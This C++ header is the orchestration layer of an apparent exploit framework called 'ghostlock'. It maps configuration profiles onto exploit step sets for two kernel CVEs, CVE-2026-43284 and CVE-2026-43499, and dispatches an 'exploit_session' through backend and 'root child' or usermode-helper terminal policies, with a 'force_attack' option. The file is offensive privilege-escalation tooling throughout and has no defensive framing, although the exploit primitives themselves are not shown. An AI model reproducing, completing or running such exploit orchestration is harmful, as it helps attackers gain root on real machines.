#ifndef GHOSTLOCK_ORCHESTRATOR_HPP
#define GHOSTLOCK_ORCHESTRATOR_HPP

#include "contract/identity.hpp"
#include "pipeline/component_catalog.hpp"
#include "pipeline/pipeline.hpp"
#include "backend/cve_2026_43284/schema.hpp"
#include "backend/cve_2026_43284_backend.hpp"
#include "backend/cve_2026_43499/backend_profile.hpp"
#include "backend/cve_2026_43499_backend.hpp"
#include "profile/binary.h"
#include "session/core_session.hpp"
#include "terminal/root_child.hpp"
#include "terminal/umh_forward.hpp"

namespace ghostlock::pipeline {
    /* Validate the component selection outside the sensitive window and dispatch
     * the catalogued (backend, terminal) pair through direct template calls (no
     * indirect dispatch). The switch enumerates the exact values
     * component_catalog::dispatch_target() can return, and every Pipeline
     * instantiation is compile-time checked against the catalogue, so predicate
     * and dispatch share one authority. */
    /* Map the wire selection onto the catalogued StepSet. The backend owns the
     * key (its private section); the composition root only routes by backend.
     * An absent/unknown id maps to Unknown, which selection_supported()
     * rejects, preserving the historical fail-closed behaviour. */
    [[nodiscard]] inline contract::StepSetKind wire_stepset(const profile::Document &document) {
        const uint16_t raw =
                document.backend == ghostlock::binary_profile::kBackendCve202643284
                        ? ghostlock::backend::steps_from(document)
                        : ghostlock::backend::cve_2026_43499::backend_profile::steps_from(
                                  document);
        switch (raw) {
            case 1: return contract::StepSetKind::W1W2;
            case 2: return contract::StepSetKind::W1W3;
            case 3: return contract::StepSetKind::PageCacheWrite;
            default: return contract::StepSetKind::Unknown;
        }
    }

    [[nodiscard]] inline RunResult run_orchestrated_pipeline(
        session::CoreSession &exploit_session, const contract::ComponentSelection &selection,
        const profile::Document &document, const char *debug_dir, bool force_attack) {
        /* Fail-closed gate: combination_supported() only says the triple is
         * catalogued/wired; selection_supported() is the device-verified
         * availability fact. A catalogued-but-unavailable backend (43284 until
         * the B5-9 gate) must never run, so reject before dispatch even if this
         * entry point is called directly. */
        if (!contract::selection_supported(selection)) {
            return RunResult{.code = RunCode::Rejected};
        }
        /* PI-window-outside: each Pipeline::run constructs/destroys the selected
         * backend's state through the BackendState RAII guard (ADR-0002 / D3),
         * so the composition root no longer names 43499 or its state. */
        switch (dispatch_target(selection)) {
            case DispatchTarget::Cve43499W1W3_RootChild: {
                using P = Pipeline<ghostlock::backend::Cve2026_43499Policy,
                                   ghostlock::terminal::RootChildPolicy>;
                static_assert(P::target == DispatchTarget::Cve43499W1W3_RootChild,
                              "dispatch case must match the pipeline's target");
                return P::run(exploit_session, document, debug_dir, force_attack);
            }
            case DispatchTarget::Cve43499W1W2_RootChild: {
                using P = Pipeline<ghostlock::backend::Cve43499_W1W2,
                                   ghostlock::terminal::RootChildPolicy>;
                static_assert(P::target == DispatchTarget::Cve43499W1W2_RootChild,
                              "dispatch case must match the pipeline's target");
                return P::run(exploit_session, document, debug_dir, force_attack);
            }
            case DispatchTarget::Cve43284PageCache_UmhForward: {
                using P = Pipeline<ghostlock::backend::Cve2026_43284Policy,
                                   ghostlock::terminal::UmhForwardPolicy>;
                static_assert(P::target == DispatchTarget::Cve43284PageCache_UmhForward,
                              "dispatch case must match the pipeline's target");
                return P::run(exploit_session, document, debug_dir, force_attack);
            }
            case DispatchTarget::None:
                return RunResult{.code = RunCode::Rejected};
        }
        return RunResult{.code = RunCode::Rejected};
    }
} // namespace ghostlock::pipeline

#endif
